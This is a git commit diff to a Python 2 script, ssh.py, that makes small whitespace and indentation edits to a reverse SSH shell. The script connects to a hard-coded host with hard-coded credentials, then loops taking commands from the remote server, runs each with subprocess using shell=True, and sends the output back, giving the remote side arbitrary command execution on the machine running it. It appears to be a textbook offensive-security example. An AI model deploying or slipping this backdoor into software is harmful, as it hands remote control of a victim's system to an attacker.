7cdc02b6c8a52b85d7402a76d81e32ceab6c220c
Gokul R Krishnan <63335983+gokulkrishnxn@users.noreply.github.com>
2022-01-17 18:16:21 +0530

    Add files via upload

--- ssh.py
+++ ssh.py
@@ -13,15 +13,15 @@ def ssh_command(ip, user, passwd, command):
 	ssh_session = client.get_transport().open_session()
 	if ssh_session.active:
 		ssh_session.send(command)
-		print ssh_session.recv(1024) # read banner
+		print ssh_session.recv(1024)# read banner
 		while True:
-			command = ssh_session.recv(1024) # get the command from the ssh server
+			command = ssh_session.recv(1024) #get the command from the ssh server
 			try:
 				cmd_output = subprocess.check_output(command, shell=True)
 				ssh_session.send(cmd_output)
 			except Exception, e:
 				ssh_session.send(str(e))
-			client.close()
+		client.close()
 	return
 
 	ssh_command('192.168.100.131', 'justin', 'lovesthepython', 'id') # chnage the ip and user and the password with id
